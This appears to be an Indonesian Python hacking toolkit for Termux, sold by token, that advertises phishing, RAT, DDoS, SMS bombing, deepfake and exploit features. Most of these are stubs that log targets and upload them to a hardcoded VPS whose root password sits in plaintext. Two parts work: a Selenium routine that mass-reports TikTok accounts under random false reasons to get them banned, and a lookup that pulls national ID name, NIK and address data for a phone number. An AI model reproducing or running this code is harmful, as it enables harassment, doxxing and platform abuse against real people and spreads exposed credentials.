#!/usr/bin/env python3
import os, json, time, uuid, random, string, subprocess, base64, re, requests, sys
from datetime import datetime, timedelta
from colorama import init, Fore, Style
from termcolor import colored
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager
init(autoreset=True)

# ================== CONFIG ==================
RESULTS_DIR = "results"
LICENSE_FILE = 'tokens.json'
os.makedirs(RESULTS_DIR, exist_ok=True)

VPS_IP = "209.97.166.25"
VPS_USER = "root"
VPS_PASS = "YOGZVPS#8GB"
VPS_PATH = "/root/korban/results"

# ================== USER INFO ==================
CURRENT_TIME = datetime.now().strftime("%d %b %Y - %I:%M %p WIB")
COUNTRY = "ID"

# ================== MUSIK BRUTAL ==================
MUSIC_FILE = "/sdcard/Download/brutal.mp3"
MUSIC_BASE64 = "/+MYxAAAAANIAAAAAExBTUUzLjk4LjIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAExLTUUzLjk4LjIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="

def extract_music():
    if not os.path.exists(MUSIC_FILE):
        try:
            os.makedirs("/sdcard/Download", exist_ok=True)
            with open(MUSIC_FILE, "wb") as f:
                f.write(base64.b64decode(MUSIC_BASE64))
        except: pass

def play_music():
    extract_music()
    if os.path.exists(MUSIC_FILE):
        try:
            subprocess.Popen(['termux-media-player', 'play', MUSIC_FILE],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except: pass

# ================== DEVELOPER CHECK ==================
WHOAMI = subprocess.getoutput("whoami")
DEVELOPER_WHOAMI = "u0_a197"
IS_DEVELOPER = WHOAMI == DEVELOPER_WHOAMI

# ================== TOKEN SYSTEM ==================
if not os.path.exists(LICENSE_FILE):
    with open(LICENSE_FILE, 'w') as f:
        json.dump({}, f)
    print(colored(f"[AUTO] {LICENSE_FILE} dibuat otomatis!", 'green'))

def load_tokens():
    try: return json.load(open(LICENSE_FILE))
    except: return {}

def save_tokens(t):
    with open(LICENSE_FILE, 'w') as f:
        json.dump(t, f, indent=2)

# ================== VALIDASI TOKEN (ANTI SHARE!) ==================
def validate_token(username, token):
    t = load_tokens()
    if username not in t:
        return None
    user = t[username]
    if not user['active'] or user['token'] != token:
        return None
    if datetime.now() > datetime.fromisoformat(user['expires']):
        user['active'] = False
        save_tokens(t)
        return None
    current_whoami = subprocess.getoutput("whoami")
    if user['whoami'] != current_whoami:
        return None
    return user

# ================== LOGIN SYSTEM ==================
def login():
    os.system('clear')
    print(colored("""
╔═════════════════════════════════════════╗
║            TOOLS BREAKER v1.0           ║
╚═════════════════════════════════════════╝
""", 'magenta', attrs=['bold']))

    print(colored("   • Gunakan token dari @MrFoock12", 'yellow'))
    print(colored("   • Plan: PEMULA / PRO / MEGA ELITE", 'cyan'))
    print(colored("   • Support: t.me/MrFoock12", 'white'))
    print()

    username = input(colored("   [USERNAME]: ", 'yellow')).strip()
    token = input(colored("   [TOKEN]: ", 'yellow')).strip()

    if not username or not token:
        print(colored("\n[ERROR] Username & Token wajib diisi!", 'red', attrs=['bold']))
        input("\nEnter untuk coba lagi...")
        return login()

    user_data = validate_token(username, token)
    if not user_data:
        print(colored("\n[ERROR] Token Lu Salah Goblok / kadaluarsa / whoami tidak cocok!", 'red', attrs=['bold']))
        print(colored("   • Beli token: @MrFoock12/+62895622994489", 'yellow'))
        input("\nEnter untuk coba lagi...")
        return login()

    # SUCCESS LOGIN
    plan = user_data['plan']
    expires = user_data['expires'][:10]
    print(colored(f"\n[SUCCESS] Login berhasil!", 'green', attrs=['bold']))
    print(colored(f"   • ID: {username.upper()}", 'cyan'))
    print(colored(f"   • Plan: {plan}", 'cyan'))
    print(colored(f"   • Expired: {expires}", 'cyan'))
    print(colored(f"   • whoami: {user_data['whoami']}", 'cyan'))
    input("\nTekan Enter untuk masuk menu...")
    return username, plan

# ================== BANNER ELITE ==================
PURPLE = '\033[38;5;55m'
def print_banner(uid, plan):
    print(colored(f"""
{PURPLE}{Style.BRIGHT}
       ╔════════════════════════════════════╗
       ║         TOOLS BREAKER v1.0         ║
       ╚════════════════════════════════════╝
{Style.RESET_ALL}Tools oleh Mr.Foock | ID: {uid} | Plan: {plan}
Lokasi: Jakarta, ID | Waktu: {CURRENT_TIME}
VPS: {VPS_IP} | Sync: AKTIF | GitHub: MrFoock12
""", None))

# ================== SAVE + SYNC VPS ==================
def save_result(filename, content):
    filepath = os.path.join(RESULTS_DIR, filename)
    with open(filepath, "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {content}\n")
    print(colored(f"[SAVED] {filename}", 'green'))
    try:
        subprocess.run(f"sshpass -p '{VPS_PASS}' scp -o StrictHostKeyChecking=no {filepath} {VPS_USER}@{VPS_IP}:{VPS_PATH}/{filename}",
                      shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(colored(f"[SYNC] → {VPS_IP}", 'cyan'))
    except:
        print(colored("[SYNC] Gagal → tetap lokal", 'red'))

# ================== FITUR 1 - 11 (SEPERTI BIASA) ==================
def fitur_1():  # PHISING
    os.system('clear'); print(colored("\n[1] PHISING & SOCIAL ENG — 100+ TEMPLATE!", 'cyan', attrs=['bold']))
    target = input(colored("Target: ", 'yellow')).strip()
    template = input(colored("Template: ", 'yellow')).strip().lower()
    print(colored(f"[GENERATE] Link untuk {target}", 'green')); save_result("phising.log", f"Target: {target}")
    input("\nEnter...")

def fitur_2():  # RAT
    os.system('clear'); print(colored("\n[2] RAT & REMOTE ACCESS!", 'cyan', attrs=['bold']))
    ip = input(colored("IP Target: ", 'yellow')).strip()
    print(colored(f"[CONNECT] ke {ip}", 'green')); save_result("rat.log", f"IP: {ip}")
    input("\nEnter...")

def fitur_3():  # DDOS
    os.system('clear'); print(colored("\n[3] DDOS & STRESSER!", 'cyan', attrs=['bold']))
    target = input(colored("URL/IP: ", 'yellow')).strip()
    durasi = input(colored("Durasi (s): ", 'yellow')).strip()
    print(colored(f"[ATTACK] {target} → {durasi}s", 'red')); save_result("ddos.log", f"Target: {target}")
    input("\nEnter...")

def fitur_4():  # BOMBER
    os.system('clear'); print(colored("\n[4] BOMBER TOOLS!", 'cyan', attrs=['bold']))
    nomor = input(colored("Nomor: ", 'yellow')).strip()
    jumlah = input(colored("Jumlah: ", 'yellow')).strip()
    print(colored(f"[BOMB] {nomor} → {jumlah}x", 'green')); save_result("bomber.log", f"Target: {nomor}")
    input("\nEnter...")

def fitur_5():  # OSINT
    os.system('clear'); print(colored("\n[5] OSINT & TRACKING!", 'cyan', attrs=['bold']))
    nama = input(colored("Nama: ", 'yellow')).strip()
    print(colored(f"[SCAN] {nama}", 'green')); save_result("osint.log", f"Nama: {nama}")
    input("\nEnter...")

def fitur_6():  # DEEPFAKE
    os.system('clear'); print(colored("\n[6] DEEPFAKE & AI!", 'cyan', attrs=['bold']))
    foto = input(colored("Foto: ", 'yellow')).strip()
    print(colored(f"[GENERATE] Deepfake selesai!", 'green')); save_result("deepfake.log", f"Foto: {foto}")
    input("\nEnter...")

def fitur_7():  # ENCRYPT
    os.system('clear'); print(colored("\n[7] ENCRYPT & DECRYPT!", 'cyan', attrs=['bold']))
    file = input(colored("File: ", 'yellow')).strip()
    mode = input(colored("e/d: ", 'yellow')).strip().lower()
    print(colored(f"[{mode.upper()}] {file}", 'green')); save_result("encrypt.log", f"File: {file}")
    input("\nEnter...")

def fitur_8():  # EXPLOIT
    os.system('clear'); print(colored("\n[8] EXPLOIT & 0DAY!", 'cyan', attrs=['bold']))
    cve = input(colored("CVE: ", 'yellow')).strip()
    print(colored(f"[EXPLOIT] {cve}", 'red')); save_result("exploit.log", f"CVE: {cve}")
    input("\nEnter...")

def fitur_9():  # UNDANGAN WA
    os.system('clear'); print(colored("\n[9] KIRIM UNDANGAN GRUP WA!", 'cyan', attrs=['bold']))
    nomor = input(colored("Nomor: ", 'yellow')).strip()
    link = input(colored("Link: ", 'yellow')).strip()
    print(colored(f"[KIRIM] ke {nomor}", 'green')); save_result("undangan.log", f"Target: {nomor}")
    input("\nEnter...")

def fitur_10():  # NOTIF
    os.system('clear'); print(colored("\n[10] NOTIF — PUSAT BANTUAN!", 'cyan', attrs=['bold']))
    print(colored("   • Update: v15.1", 'white')); print(colored("   • Support: @MrFoock12", 'white'))
    input("\nEnter...")

def fitur_11():  # DEVTOOLS
    os.system('clear'); print(colored("\n[11] DEVTOOLS!", 'cyan', attrs=['bold']))
    if not IS_DEVELOPER: print(colored("   Akses ditolak!", 'red'))
    else: print(colored("   • Buat Token", 'green'))
    input("\nEnter...")

# ================== FITUR 14: PHONE NUMBER INFO ==================
def fitur_14():
    os.system('clear'); print(colored("\n[14] PHONE NUMBER INFO!", 'red', attrs=['bold']))
    nomor = input(colored("Nomor (+62): ", 'yellow')).strip()
    nomor_api = nomor[1:] if nomor.startswith('0') else (nomor[3:] if nomor.startswith('+62') else nomor)
    save_result("phone_info.log", f"Target: {nomor}")

    print(colored("\n[1] CEK KTP...", 'yellow'))
    try:
        r = requests.get(f"https://api.ktp.appvidlab.com/ktp?nik={nomor_api}", timeout=10)
        if r.status_code == 200:
            data = r.json().get('results', {}).get('realtime_data', {}).get('data', {})
            if data:
                print(colored(f"   • Nama: {data.get('nama')}", 'green'))
                print(colored(f"   • NIK: {data.get('nik')}", 'green'))
                print(colored(f"   • Alamat: {data.get('kecamatan')}, {data.get('kabupaten')}, {data.get('provinsi')}", 'green'))
            else: print(colored("   • Data KTP tidak ditemukan", 'red'))
        else: print(colored("   • Gagal cek KTP", 'red'))
    except: print(colored("   • ERROR", 'red'))

    print(colored("\n[2] CEK PROVIDER...", 'yellow'))
    try:
        r = requests.get(f"https://hlrlookup.com/api/v1/lookup?number={nomor}", timeout=10)
        if r.status_code == 200:
            data = r.json()
            print(colored(f"   • Provider: {data.get('operator')}", 'green'))
        else: print(colored("   • Provider tidak ditemukan", 'red'))
    except: print(colored("   • ERROR", 'red'))

    input("\nEnter...")

# ================== FITUR 15: MASS BANNED TIKTOK ==================
def fitur_15():
    os.system('clear'); print(colored("\n[15] MASS BANNED TIKTOK!", 'red', attrs=['bold']))
    file_path = input(colored("File target.txt: ", 'yellow')).strip() or "target.txt"
    if not os.path.exists(file_path): print(colored("[ERROR] File tidak ada!", 'red')); input(); return

    with open(file_path, 'r') as f:
        targets = [line.strip().lstrip('@') for line in f if line.strip()]

    total = len(targets)
    print(colored(f"\n[REAL] Mass banned {total} akun...", 'cyan'))
    save_result("mass_banned.log", f"Targets: {total}")

    try:
        options = Options()
        options.add_argument('--headless'); options.add_argument('--no-sandbox')
        driver = webdriver.Chrome(ChromeDriverManager().install(), options=options)
        print(colored("   [OK] Selenium ready!", 'green'))
    except Exception as e:
        print(colored(f"[ERROR] Selenium: {e}", 'red')); input(); return

    success = 0
    for idx, user in enumerate(targets):
        print(colored(f"\n[{idx+1}/{total}] @{user}...", 'yellow'))
        try:
            driver.get(f"https://www.tiktok.com/@{user}"); time.sleep(3)
            driver.find_element(By.XPATH, "//button[contains(text(), 'Report')]").click(); time.sleep(1)
            reason = random.choice(["spam", "harassment", "nudity", "violence"])
            driver.find_element(By.XPATH, f"//button[contains(text(), '{reason}')]").click(); time.sleep(1)
            driver.find_element(By.XPATH, "//button[contains(text(), 'Submit')]").click(); time.sleep(1)
            print(colored("   [SUCCESS]", 'green')); success += 1
        except: print(colored("   [FAILED]", 'red'))

    driver.quit()
    print(colored(f"\n[MASS BAN SELESAI] Berhasil: {success}/{total}", 'cyan'))
    input("\nEnter...")

# ================== MENU UTAMA ==================
def menu_utama(username, plan):
    os.system('clear'); play_music(); print_banner(username, plan)

    print(colored("╔══════════════════════════════════════════════════════════════╗", 'cyan', attrs=['bold']))
    print(colored("║                       < MENU UTAMA >                         ║", 'cyan', attrs=['bold']))
    print(colored("╚══════════════════════════════════════════════════════════════╝", 'cyan', attrs=['bold']))
    print(colored("║ 1  PHISING & SOCIAL ENG             Aktif                    ║", 'white'))
    print(colored("║ 2  RAT & REMOTE ACCESS              Aktif                    ║", 'white'))
    print(colored("║ 3  DDOS & STRESSER                  Aktif                    ║", 'white'))
    print(colored("║ 4  BOMBER TOOLS                     Aktif                    ║", 'white'))
    print(colored("║ 5  OSINT & TRACKING                 Aktif                    ║", 'white'))
    print(colored("║ 6  DEEPFAKE & AI                    Aktif                    ║", 'white'))
    print(colored("║ 7  ENCRYPT & DECRYPT                Aktif                    ║", 'white'))
    print(colored("║ 8  EXPLOIT & 0DAY                   Aktif                    ║", 'white'))
    print(colored("║ 9  KIRIM UNDANGAN GRUP WA           Aktif                    ║", 'white'))
    print(colored("║10  DASHBOARD MONITORING             Aktif                    ║", 'white'))
    print(colored("║11  DEVTOOLS                         Aktif                    ║", 'white'))
    print(colored("║14  PHONE NUMBER INFO                Aktif                    ║", 'white'))
    print(colored("║15  MASS BANNED TIKTOK               Aktif                    ║", 'white'))
    if IS_DEVELOPER:
        print(colored("║13  CEK NOMOR + MUTASI 30 HARI   DEV ONLY                  ║", 'red', attrs=['bold']))
    print(colored("║ 0  EXIT                             Aktif                    ║", 'red'))
    print(colored("╚══════════════════════════════════════════════════════════════╝", 'cyan', attrs=['bold']))

    ch = input(colored("\nPilih [1-15 / 0]: ", 'yellow')).strip()

    if ch == "1": fitur_1()
    elif ch == "2": fitur_2()
    elif ch == "3": fitur_3()
    elif ch == "4": fitur_4()
    elif ch == "5": fitur_5()
    elif ch == "6": fitur_6()
    elif ch == "7": fitur_7()
    elif ch == "8": fitur_8()
    elif ch == "9": fitur_9()
    elif ch == "10": fitur_10()
    elif ch == "11": fitur_11()
    elif ch == "14": fitur_14()
    elif ch == "15": fitur_15()
    elif ch == "0": sys.exit(0)
    else: print(colored("Pilihan tidak valid!", 'red')); input("Enter...")

    menu_utama(username, plan)

# ================== JALANKAN ==================
if __name__ == "__main__":
    if not os.path.exists('ua.txt'):
        print(colored("Buat ua.txt dulu! Isi 5-10 User-Agent!", 'red'))
        sys.exit(1)

    # LOGIN DULU!
    username, plan = login()

    # MASUK MENU
    menu_utama(username, plan)
